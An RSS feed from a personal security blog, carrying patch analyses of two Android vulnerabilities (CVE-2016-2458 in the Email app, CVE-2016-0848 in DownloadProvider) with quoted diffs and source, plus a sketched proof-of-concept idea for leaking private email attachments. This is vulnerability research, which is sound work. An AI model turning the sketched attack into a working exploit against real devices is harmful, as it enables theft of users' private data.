<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Vulnerability on Zeqi&#39;s Blog</title>
    <link>https://zeqiii.github.io/tags/vulnerability/</link>
    <description>Recent content in Vulnerability on Zeqi&#39;s Blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-EN</language>
    <managingEditor>zeqiii@163.com (zeqi)</managingEditor>
    <webMaster>zeqiii@163.com (zeqi)</webMaster>
    <copyright>(c) 2016 zeqi</copyright>
    <lastBuildDate>Tue, 17 May 2016 10:27:54 +0800</lastBuildDate>
    <atom:link href="https://zeqiii.github.io/tags/vulnerability/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Race Condition</title>
      <link>https://zeqiii.github.io/2016/05/17/race-condition/</link>
      <pubDate>Tue, 17 May 2016 10:27:54 +0800</pubDate>
      <author>zeqiii@163.com (zeqi)</author>
      <guid>https://zeqiii.github.io/2016/05/17/race-condition/</guid>
      <description>&lt;p&gt;CVE-2016-2458 is a race condition problem. This blog records some survey on race condition, and think about race condition in Android.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Wiki&amp;rsquo;s description about race condition&lt;/strong&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;A race condition or race hazard is the behavior of an electronic, software or other system where the output is dependent on the sequence or timing of other uncontrollable events. It becomes a bug when events do not happen in the order the programmer intended. The term originates with the idea of two signals racing each other to influence the output first.&lt;/p&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>Analysis of cve-2016-2458</title>
      <link>https://zeqiii.github.io/2016/05/09/analysis-of-cve-2016-2458/</link>
      <pubDate>Mon, 09 May 2016 19:17:06 +0800</pubDate>
      <author>zeqiii@163.com (zeqi)</author>
      <guid>https://zeqiii.github.io/2016/05/09/analysis-of-cve-2016-2458/</guid>
      <description>

&lt;h2 id=&#34;introduction&#34;&gt;Introduction&lt;/h2&gt;

&lt;p&gt;A breif introduction of cve-2016-2458 can be found in &lt;a href=&#34;https://source.android.com/security/bulletin/2016-05-01.html&#34;&gt;Security Bulletin&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;The patch to this vulnerability has two parts, one is in &lt;code&gt;com.android.email&lt;/code&gt;, which adds function &lt;code&gt;getEmailProviderAuthority()&lt;/code&gt; to &lt;code&gt;ComposeActivityEmail.java&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;+    @Override
+    protected String getEmailProviderAuthority() {
+        return EmailContent.AUTHORITY;
+    }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The other part is in &lt;code&gt;com.android.mail&lt;/code&gt;, fixes the codes in &lt;code&gt;ComposeActivity.java&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;     /**
+     * @return the authority of EmailProvider for this app. should be overridden in concrete
+     * app implementations. can&#39;t be known here because this project doesn&#39;t know about that sort
+     * of thing.
+     */
+    protected String getEmailProviderAuthority() {
+        throw new UnsupportedOperationException(&amp;quot;unimplemented, EmailProvider unknown&amp;quot;);
+    }
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;+    /**
      * Helper function to handle a list of uris to attach.
      * @return the total size of all successfully attached files.
      */
@@ -1921,7 +1930,7 @@
         for (Uri uri : uris) {
             try {
                 if (uri != null) {
-                    if (&amp;quot;file&amp;quot;.equals(uri.getScheme())) {
+                    if (ContentResolver.SCHEME_FILE.equals(uri.getScheme())) {
                         // We must not allow files from /data, even from our process.
                         final File f = new File(uri.getPath());
                         final String filePath = f.getCanonicalPath();
@@ -1931,7 +1940,16 @@
                                   &amp;quot;send_intent_attachment&amp;quot;, &amp;quot;data_dir&amp;quot;, 0);
                           continue;
                         }
+                    } else if (ContentResolver.SCHEME_CONTENT.equals(uri.getScheme())) {
+                        // disallow attachments from our own EmailProvider (b/27308057)
+                        if (getEmailProviderAuthority().equals(uri.getAuthority())) {
+                            showErrorToast(getString(R.string.attachment_permission_denied));
+                            Analytics.getInstance().sendEvent(ANALYTICS_CATEGORY_ERRORS,
+                                    &amp;quot;send_intent_attachment&amp;quot;, &amp;quot;email_provider&amp;quot;, 0);
+                            continue;
+                        }
                     }
+
                     if (!handleSpecialAttachmentUri(uri)) {
                         final Attachment a = mAttachmentsView.generateLocalAttachment(uri);
                         attachments.add(a);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The main content of this patch is in function &lt;code&gt;handleAttachmentUrisFromIntent(List&amp;lt;Uri&amp;gt; uris)&lt;/code&gt;, which seems like having the ability to handle attachment of a mail. The following work is about studying how &lt;code&gt;com.android.email&lt;/code&gt; works and analyzing this vulnerability.&lt;/p&gt;

&lt;h2 id=&#34;composeactivity&#34;&gt;ComposeActivity&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;ComposeActivity&lt;/code&gt; is a compoenent of &lt;code&gt;com.android.mail&lt;/code&gt;, &lt;code&gt;ComposeActivityEmail&lt;/code&gt;, which is a component of &lt;code&gt;com.android.email&lt;/code&gt;, is its child. The edit page of email is actually the &lt;code&gt;ComposeActivityEmail&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zeqiii.github.io/img/cve-2016-2458/composeactivity2.png&#34; alt=&#34;ComposeActivity&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zeqiii.github.io/img/cve-2016-2458/composeactivity.png&#34; alt=&#34;ComposeActivity&#34; /&gt;&lt;/p&gt;

&lt;h2 id=&#34;analysis-of-the-patch&#34;&gt;Analysis of the patch&lt;/h2&gt;

&lt;p&gt;Before patched, if a uri is passed to &lt;code&gt;handleAttachementUrisFromIntent()&lt;/code&gt;, and this uri doesn&amp;rsquo;t start with &amp;laquo;file&amp;raquo;, it will be handled by:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;if (!handleSpecialAttachmentUri(uri)) {
    final Attachment a = mAttachmentsView.generateLocalAttachment(uri);
    attachments.add(a);

    Analytics.getInstance().sendEvent(&amp;quot;send_intent_attachment&amp;quot;,
    Utils.normalizeMimeType(a.getContentType()), null, a.size);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;handleSpecialAttachmentUri()&lt;/code&gt; returns &lt;code&gt;false&lt;/code&gt; permenantly. This function can be overrided, allowing subclasses to implement custom handling of attachments.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;/**
 * Allow subclasses to implement custom handling of attachments.
 *
 * @param contentUri a passed-in URI from a pick intent
 * @return true iff handled
 */
protected boolean handleSpecialAttachmentUri(final Uri contentUri) {
    return false;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Function &lt;code&gt;AttachmentsView.generateLocalAttachment(Uri contentUri)&lt;/code&gt; returns a new &lt;code&gt;Attachment&lt;/code&gt; object, which is generated by the &lt;code&gt;contentUri&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public Attachment generateLocalAttachment(Uri contentUri) throws AttachmentFailureException {
    final ContentResolver contentResolver = getContext().getContentResolver();
    String contentType = contentResolver.getType(contentUri);
    if (contentType == null) contentType = &amp;quot;&amp;quot;;

    final Attachment attachment = new Attachment();
    attachment.uri = null; // URI will be assigned by the provider upon send/save
    attachment.setName(null);
    attachment.size = 0;
    attachment.contentUri = contentUri;
    attachment.thumbnailUri = contentUri;

    Cursor metadataCursor = null;
    try {
        metadataCursor = contentResolver.query(
                contentUri, new String[]{OpenableColumns.DISPLAY_NAME, OpenableColumns.SIZE},
                null, null, null);
        if (metadataCursor != null) {
            try {
                if (metadataCursor.moveToNext()) {
                    attachment.setName(metadataCursor.getString(0));
                    attachment.size = metadataCursor.getInt(1);
                }
            } finally {
                metadataCursor.close();
            }
        }
    } catch {
        ...
    }
    
    if (attachment.getName() == null) {
        attachment.setName(contentUri.getLastPathSegment());
    }
    if (attachment.size == 0) {
        // if the attachment is not a content:// for example, a file:// URI
        attachment.size = getSizeFromFile(contentUri, contentResolver);
    }
    attachment.setContentType(contentType);
    return attachment;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The patch adds an additional handling to uris begin with &amp;laquo;content&amp;raquo;, disallowing attachments from EmailProvider:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;else if (ContentResolver.SCHEME_CONTENT.equals(uri.getScheme())) {
    if (getEmailProviderAuthority().equals(uri.getAuthority())) {
        showErrorToast(getString(R.string.attachment_permission_denied));
        Analytics.getInstance().sendEvent(ANALYTICS_CATEGORY_ERRORS, &amp;quot;send_intent_attachment&amp;quot;, &amp;quot;email_provider&amp;quot;, 0);
        continue;
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;getEmailProviderAuthority()&lt;/code&gt; returns &lt;code&gt;EmailContent.AUTHORITY&lt;/code&gt;, whose value is &amp;laquo;com.android.email.provider&amp;raquo;, so all uris start with &lt;code&gt;content://com.android.email.provider&lt;/code&gt; will be aborted.&lt;/p&gt;

&lt;p&gt;So, let&amp;rsquo;s try to construct an email whose attachement is a uri that start with &lt;code&gt;content://com.android.email.provider&lt;/code&gt;, and see what&amp;rsquo;s will happen.&lt;/p&gt;

&lt;h2 id=&#34;how-email-works&#34;&gt;How Email works&lt;/h2&gt;

&lt;p&gt;To craft our POC, we should firstly figure out how Android&amp;rsquo;s email works to compose an email.&lt;/p&gt;

&lt;p&gt;** Sending Email **&lt;/p&gt;

&lt;p&gt;When we finish composing a email and click &amp;laquo;send&amp;raquo; icon, &lt;code&gt;doSend()&lt;/code&gt; is being executed.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;private void doSend() {
    sendOrSaveWithSanityChecks(false, true, false, false);
    logSendOrSave(false /* save */);
    mPerformedSendOrDiscard = true;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Tracing the code, we can find codes handling attachments in function &lt;code&gt;sendOrSave()&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;if (Utils.isRunningJellybeanOrLater()) {
    // Grant the READ permission for the attachments to the service so that
    // as long as the service stays alive we won&#39;t hit PermissionExceptions.
    final ClipDescription desc = new ClipDescription(&amp;quot;attachment_uris&amp;quot;,
              new String[]{ClipDescription.MIMETYPE_TEXT_URILIST});
    ClipData clipData = null;
    for (Attachment a : mAttachmentsView.getAttachments()) {
        if (a != null &amp;amp;&amp;amp; !Utils.isEmpty(a.contentUri)) {
            final ClipData.Item uriItem = new ClipData.Item(a.contentUri);
            if (clipData == null) {
                clipData = new ClipData(desc, uriItem);
            } else {
                clipData.addItem(uriItem);
            }
        }
    }
    i.setClipData(clipData);
    i.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;** Adding Attachments **&lt;/p&gt;

&lt;p&gt;So where does the attachment come from?&lt;/p&gt;

&lt;p&gt;When we click the button to add an attachment, &lt;code&gt;doAttach()&lt;/code&gt; is invoked.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;private void doAttach(String type) {
    Intent i = new Intent(Intent.ACTION_GET_CONTENT);
    i.addCategory(Intent.CATEGORY_OPENABLE);
    i.addFlags(Intent.FLAG_ACTIVITY_CLEAR_WHEN_TASK_RESET);
    i.putExtra(Intent.EXTRA_ALLOW_MULTIPLE, true);
    i.setType(type);
    mAddingAttachment = true;
    startActivityForResult(Intent.createChooser(i, getText(R.string.select_attachment_type)),
            RESULT_PICK_ATTACHMENT);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Then an activity will be opened, allowing us to choose a file we want to attach. The info of the file will be sent back by &lt;code&gt;setResult()&lt;/code&gt; and received by &lt;code&gt;onActivityResult()&lt;/code&gt; of &lt;code&gt;ComposeActivity&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;@Override
protected void onActivityResult(int request, int result, Intent data) {
    if (request == RESULT_PICK_ATTACHMENT) {
        mAddingAttachment = false;
        if (result == RESULT_OK) {
            addAttachmentAndUpdateView(data);
        }
    } else if (request == RESULT_CREATE_ACCOUNT) {
        ...
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now, let&amp;rsquo;s see &lt;code&gt;addAttachementAndUpdateView(Intent data)&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;private void addAttachmentAndUpdateView(Intent data) {
    if (data == null) {
        return;
    }

    if (Build.VERSION.SDK_INT &amp;gt;= Build.VERSION_CODES.JELLY_BEAN) {
        final ClipData clipData = data.getClipData();
        if (clipData != null) {
            for (int i = 0, size = clipData.getItemCount(); i &amp;lt; size; i++) {
                addAttachmentAndUpdateView(clipData.getItemAt(i).getUri());
            }
            return;
        }
    }
    addAttachmentAndUpdateView(data.getData());
}
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;private void addAttachmentAndUpdateView(Uri contentUri) {
    if (contentUri == null) {
        return;
    }
    try {
        // If a subclass implements handleSecialAttachmentUri() and make this function return true, the default handling will be skipped.
        if (handleSpecialAttachmentUri(contentUri)) {
            return;
        }
        addAttachmentAndUpdateView(mAttachmentsView.generateLocalAttachment(contentUri));
    } catch (AttachmentFailureException e) {
        ...
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here we come back to the &lt;code&gt;addAttachmentAndUpdateView()&lt;/code&gt; but with a parameter whose type is &lt;code&gt;Attachment&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&#34;conclusion-from-the-analysis&#34;&gt;Conclusion from the analysis&lt;/h2&gt;

&lt;p&gt;We can build an activity which can be selected to open when users add attachments. This activity&amp;rsquo;s &lt;code&gt;setResult()&lt;/code&gt; returns an intent whose &lt;code&gt;data&lt;/code&gt; is an uri starts with &amp;laquo;content://com.android.email.provider&amp;raquo;. This uri may point to a private resource.&lt;/p&gt;

&lt;p&gt;To build this kind of activity, we according to this:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;private void doAttach(String type) {
    Intent i = new Intent(Intent.ACTION_GET_CONTENT);
    i.addCategory(Intent.CATEGORY_OPENABLE);
    i.addFlags(Intent.FLAG_ACTIVITY_CLEAR_WHEN_TASK_RESET);
    i.putExtra(Intent.EXTRA_ALLOW_MULTIPLE, true);
    i.setType(type);
    mAddingAttachment = true;
    startActivityForResult(Intent.createChooser(i, getText(R.string.select_attachment_type)),
            RESULT_PICK_ATTACHMENT);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;demo&#34;&gt;Demo&lt;/h2&gt;
</description>
    </item>
    
    <item>
      <title>Analysis of cve-2016-0848</title>
      <link>https://zeqiii.github.io/2016/04/15/analysis-of-cve-2016-0848/</link>
      <pubDate>Fri, 15 Apr 2016 16:43:07 +0800</pubDate>
      <author>zeqiii@163.com (zeqi)</author>
      <guid>https://zeqiii.github.io/2016/04/15/analysis-of-cve-2016-0848/</guid>
      <description>

&lt;h2 id=&#34;introduction:5459385d9d0b6f9dc023b7f545e11455&#34;&gt;Introduction&lt;/h2&gt;

&lt;p&gt;In the April security bulletin of Android, cve-2016-0848 is also disclosed. Let&amp;rsquo;s analysis it!&lt;/p&gt;

&lt;p&gt;Special thanks to Tongxin Li.&lt;/p&gt;

&lt;h2 id=&#34;start-from-the-patch:5459385d9d0b6f9dc023b7f545e11455&#34;&gt;Start From the Patch&lt;/h2&gt;

&lt;p&gt;The patch consists of two parts, one is in DownloadProvider.java, the other is in Helpers.java.&lt;/p&gt;

&lt;p&gt;In DownloadProvider.java, the patch changes function &lt;code&gt;openFile()&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;-        final File file = new File(path);
+        final File file;
+        try {
+            file = new File(path).getCanonicalFile();
+        } catch (IOException e) {
+            throw new FileNotFoundException(e.getMessage());
+        }
+
         if (!Helpers.isFilenameValid(getContext(), file)) {
-            throw new FileNotFoundException(&amp;quot;Invalid file: &amp;quot; + file);
+            throw new FileNotFoundException(&amp;quot;Invalid file path: &amp;quot; + file);
         }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In Helpers.java, the patch changes function &lt;code&gt;isFilenameValid()&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;     static boolean isFilenameValid(Context context, File file) {
         final File[] whitelist;
         try {
-            file = file.getCanonicalFile();
             whitelist = new File[] {
                     context.getFilesDir().getCanonicalFile(),
                     context.getCacheDir().getCanonicalFile(),
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Before being patched, the object &lt;code&gt;file = new File(path)&lt;/code&gt; in &lt;code&gt;openFile()&lt;/code&gt; is not changed even it is passed to &lt;code&gt;isFilenameValid()&lt;/code&gt;, because the reassignment in &lt;code&gt;isFilenameValid()&lt;/code&gt; has no effect on the &lt;code&gt;file&lt;/code&gt; object in the outer function. So the &lt;code&gt;file&lt;/code&gt; in &lt;code&gt;openFile()&lt;/code&gt; may not be canonical.&lt;/p&gt;

&lt;p&gt;After being patched, &lt;code&gt;file = new File(path).getCanonicalFile()&lt;/code&gt; is done in the &lt;code&gt;openFile&lt;/code&gt; before &lt;code&gt;isFilenameValid()&lt;/code&gt; being called, so the object &lt;code&gt;file&lt;/code&gt; will be a canonical file throughout this function.&lt;/p&gt;

&lt;h2 id=&#34;how-downloadprovider-works:5459385d9d0b6f9dc023b7f545e11455&#34;&gt;How DownloadProvider Works&lt;/h2&gt;

&lt;h3 id=&#34;demo:5459385d9d0b6f9dc023b7f545e11455&#34;&gt;Demo&lt;/h3&gt;

&lt;p&gt;I write a program:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;// test download
downloadManager = (DownloadManager) getSystemService(Context.DOWNLOAD_SERVICE);
id = downloadManager.enqueue(new DownloadManager.Request(Uri.parse(&amp;quot;http://pic25.nipic.com/20121108/9252150_160744284000_2.jpg&amp;quot;)));
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This program downloads an image from the Internet. After being execute, a record will be added into &lt;code&gt;com.android.providers.downloads&lt;/code&gt;&amp;rsquo;s database.&lt;/p&gt;

&lt;p&gt;According the &lt;code&gt;AndroidManifest.xml&lt;/code&gt; in &lt;code&gt;/packages/Providers/DownloadProviders/&lt;/code&gt;, the package name of the system component where DownloadProvider exists is &amp;laquo;com.android.providers.downloads&amp;raquo;.&lt;/p&gt;

&lt;p&gt;Run &lt;code&gt;adb shell pm dump com.android.providers.downloads&lt;/code&gt;, to find the data path: &lt;code&gt;dataDir=/data/user/0/com.android.providers.downloads&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Copy the database file from &lt;code&gt;%dataDir/databases/&lt;/code&gt; to the computer and open it with any one of the sqlite tools, we will see all the download information.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zeqiii.github.io/img/cve-2016-0848/downloads_db.png&#34; alt=&#34;downloads.db&#34; /&gt;&lt;/p&gt;

&lt;h3 id=&#34;work-flow-analysis:5459385d9d0b6f9dc023b7f545e11455&#34;&gt;Work flow analysis&lt;/h3&gt;

&lt;p&gt;Code of &lt;code&gt;DownloadManager.enqueue()&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public long enqueue(Request request) {
    ContentValues values = request.toContentValues(mPackageName);
    Uri downloadUri = mResolver.insert(Downloads.Impl.CONTENT_URI, values);
    long id = Long.parseLong(downloadUri.getLastPathSegment());
    return id;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;mPackageName&lt;/code&gt; is a field, it is assigned by the constructor, which is invisible to the developer:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;/**
 * @hide
 */
public DownloadManager(ContentResolver resolver, String packageName) {
    mResolver = resolver;
    mPackageName = packageName;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;So how a DownloadManager is initialized?&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;SystemServiceRegistry&lt;/code&gt; registers DownloadManager.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;registerService(Context.DOWNLOAD_SERVICE, DownloadManager.class,
    new CachedServiceFetcher&amp;lt;DownloadManager&amp;gt;() {
        @Override
        public DownloadManager createService(ContextImpl ctx) {
            return new DownloadManager(ctx.getContentResolver(), ctx.getPackageName());
        }
    }
);

private static &amp;lt;T&amp;gt; void registerService(String serviceName, Class&amp;lt;T&amp;gt; serviceClass, ServiceFetcher&amp;lt;T&amp;gt; serviceFetcher) {
    SYSTEM_SERVICE_NAMES.put(serviceClass, serviceName);
    SYSTEM_SERVICE_FETCHERS.put(serviceName, serviceFetcher);
}

// Service registry information.
// This information is never changed once static initialization has completed.
private static final HashMap&amp;lt;Class&amp;lt;?&amp;gt;, String&amp;gt; SYSTEM_SERVICE_NAMES =
        new HashMap&amp;lt;Class&amp;lt;?&amp;gt;, String&amp;gt;();
private static final HashMap&amp;lt;String, ServiceFetcher&amp;lt;?&amp;gt;&amp;gt; SYSTEM_SERVICE_FETCHERS =
        new HashMap&amp;lt;String, ServiceFetcher&amp;lt;?&amp;gt;&amp;gt;();
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The overrided function &lt;code&gt;createService()&lt;/code&gt; is called by &lt;code&gt;ServiceFetcher.getService()&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;static abstract class CachedServiceFetcher&amp;lt;T&amp;gt; implements ServiceFetcher&amp;lt;T&amp;gt; {
    private final int mCacheIndex;

    public CachedServiceFetcher() {
        mCacheIndex = sServiceCacheSize++;
    }

    @Override
    @SuppressWarnings(&amp;quot;unchecked&amp;quot;)
    public final T getService(ContextImpl ctx) {
        final Object[] cache = ctx.mServiceCache;
        synchronized (cache) {
            // Fetch or create the service.
            Object service = cache[mCacheIndex];
            if (service == null) {
                service = createService(ctx);
                cache[mCacheIndex] = service;
            }
            return (T)service;
        }
    }

    public abstract T createService(ContextImpl ctx);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;When one calls &lt;code&gt;getSystemService(String name)&lt;/code&gt; in his application, he calls &lt;code&gt;getSystemService(String name)&lt;/code&gt; in &lt;code&gt;ContextImpl&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public Object getSystemService(String name) {
    return SystemServiceRegistry.getSystemService(this, name);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;getSystemService(ContextImpl ctx, String name)&lt;/code&gt; in &lt;code&gt;SystemServiceRegistry&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public static Object getSystemService(ContextImpl ctx, String name) {
    ServiceFetcher&amp;lt;?&amp;gt; fetcher = SYSTEM_SERVICE_FETCHERS.get(name);
    return fetcher != null ? fetcher.getService(ctx) : null;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So, &lt;code&gt;mPackageName&lt;/code&gt; is initialized in this way above.&lt;/p&gt;

&lt;p&gt;** Back to the function enqueue() **&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public long enqueue(Request request) {
    ContentValues values = request.toContentValues(mPackageName);
    Uri downloadUri = mResolver.insert(Downloads.Impl.CONTENT_URI, values);
    long id = Long.parseLong(downloadUri.getLastPathSegment());
    return id;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;request.toContentValues(mPackageName)&lt;/code&gt; resolve the application information who calls DownloadManager, and wrap the information into a ContentValues object.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;ContentValues toContentValues(String packageName) {
    ContentValues values = new ContentValues();
    assert mUri != null;
    values.put(Downloads.Impl.COLUMN_URI, mUri.toString());
    values.put(Downloads.Impl.COLUMN_IS_PUBLIC_API, true);
    values.put(Downloads.Impl.COLUMN_NOTIFICATION_PACKAGE, packageName);

    if (mDestinationUri != null) {
        values.put(Downloads.Impl.COLUMN_DESTINATION, Downloads.Impl.DESTINATION_FILE_URI);
        values.put(Downloads.Impl.COLUMN_FILE_NAME_HINT, mDestinationUri.toString());
    } else {
        values.put(Downloads.Impl.COLUMN_DESTINATION, (this.mUseSystemCache) ?
            Downloads.Impl.DESTINATION_SYSTEMCACHE_PARTITION :
            Downloads.Impl.DESTINATION_CACHE_PARTITION_PURGEABLE);
    }
    // is the file supposed to be media-scannable?
    values.put(Downloads.Impl.COLUMN_MEDIA_SCANNED, (mScannable) ? SCANNABLE_VALUE_YES : SCANNABLE_VALUE_NO);

    if (!mRequestHeaders.isEmpty()) {
        encodeHttpHeaders(values);
    }

    putIfNonNull(values, Downloads.Impl.COLUMN_TITLE, mTitle);
    putIfNonNull(values, Downloads.Impl.COLUMN_DESCRIPTION, mDescription);
    putIfNonNull(values, Downloads.Impl.COLUMN_MIME_TYPE, mMimeType);

    values.put(Downloads.Impl.COLUMN_VISIBILITY, mNotificationVisibility);
    values.put(Downloads.Impl.COLUMN_ALLOWED_NETWORK_TYPES, mAllowedNetworkTypes);
    values.put(Downloads.Impl.COLUMN_ALLOW_ROAMING, mRoamingAllowed);
    values.put(Downloads.Impl.COLUMN_ALLOW_METERED, mMeteredAllowed);
    values.put(Downloads.Impl.COLUMN_IS_VISIBLE_IN_DOWNLOADS_UI, mIsVisibleInDownloadsUi);

    return values;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The value of &lt;code&gt;CONTENT_URI&lt;/code&gt; is:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public static final Uri CONTENT_URI = Uri.parse(&amp;quot;content://downloads/my_downloads&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So &lt;code&gt;mResolver.insert(Downloads.Impl.CONTENT_URI, values)&lt;/code&gt; invokes the insert method of &lt;code&gt;DownloadProvider&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;This is the component definition in &lt;code&gt;AndroidManifest.xml&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-xml&#34;&gt;&amp;lt;provider android:name=&amp;quot;.DownloadProvider&amp;quot; 
          android:authorities=&amp;quot;downloads&amp;quot; android:exported=&amp;quot;true&amp;quot;&amp;gt;
  &amp;lt;!-- Anyone can access /my_downloads, the provider internally restricts access by UID for these URIs --&amp;gt;
  &amp;lt;path-permission android:pathPrefix=&amp;quot;/my_downloads&amp;quot;
                   android:permission=&amp;quot;android.permission.INTERNET&amp;quot;/&amp;gt;
  ...
&amp;lt;/provider&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The &lt;code&gt;insert()&lt;/code&gt; of &lt;code&gt;DownloadProvider&lt;/code&gt; will insert an item to the &lt;code&gt;downloads.db&lt;/code&gt;, and the &lt;code&gt;DownloadService&lt;/code&gt; will finish the download task.&lt;/p&gt;

&lt;h3 id=&#34;openfile-uri-uri-string-mode:5459385d9d0b6f9dc023b7f545e11455&#34;&gt;openFile(Uri uri, String mode)&lt;/h3&gt;

&lt;p&gt;&lt;code&gt;openFile(Uri uri, String mode)&lt;/code&gt; is an abstract fucntion of &lt;code&gt;ContentProvider&lt;/code&gt;, subclasses inherited from ContentProvider should implement this function to provide access of content files to others application.&lt;/p&gt;

&lt;p&gt;Here is the &lt;code&gt;openFile()&lt;/code&gt; of &lt;code&gt;DownloadProvider&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public ParcelFileDescriptor openFile(final Uri uri, String mode) throws FileNotFoundException {

    final Cursor cursor = queryCleared(uri, new String[] {
            Downloads.Impl._DATA, Downloads.Impl.COLUMN_STATUS,
            Downloads.Impl.COLUMN_DESTINATION, Downloads.Impl.COLUMN_MEDIA_SCANNED }, null, null, null);
    final String path;
    final boolean shouldScan;
    try {
        int count = (cursor != null) ? cursor.getCount() : 0;
        if (count != 1) {
            // If there is not exactly one result, throw an appropriate exception.
            ...
        }

        if (cursor.moveToFirst()) {
            final int status = cursor.getInt(1);
            final int destination = cursor.getInt(2);
            final int mediaScanned = cursor.getInt(3);

            path = cursor.getString(0);
            shouldScan = Downloads.Impl.isStatusSuccess(status) &amp;amp;&amp;amp; (
                    destination == Downloads.Impl.DESTINATION_EXTERNAL
                    || destination == Downloads.Impl.DESTINATION_FILE_URI
                    || destination == Downloads.Impl.DESTINATION_NON_DOWNLOADMANAGER_DOWNLOAD)
                    &amp;amp;&amp;amp; mediaScanned != 2;
        } else {
            throw new FileNotFoundException(&amp;quot;Failed moveToFirst&amp;quot;);
        }
    } finally {
        IoUtils.closeQuietly(cursor);
    }

    if (path == null) {
        throw new FileNotFoundException(&amp;quot;No filename found.&amp;quot;);
    }

    final File file = new File(path);
    if (!Helpers.isFilenameValid(getContext(), file)) {
        throw new FileNotFoundException(&amp;quot;Invalid file: &amp;quot; + file);
    }

    final int pfdMode = ParcelFileDescriptor.parseMode(mode);
    if (pfdMode == ParcelFileDescriptor.MODE_READ_ONLY) {
        return ParcelFileDescriptor.open(file, pfdMode);
    } else {
        try {
            // When finished writing, update size and timestamp
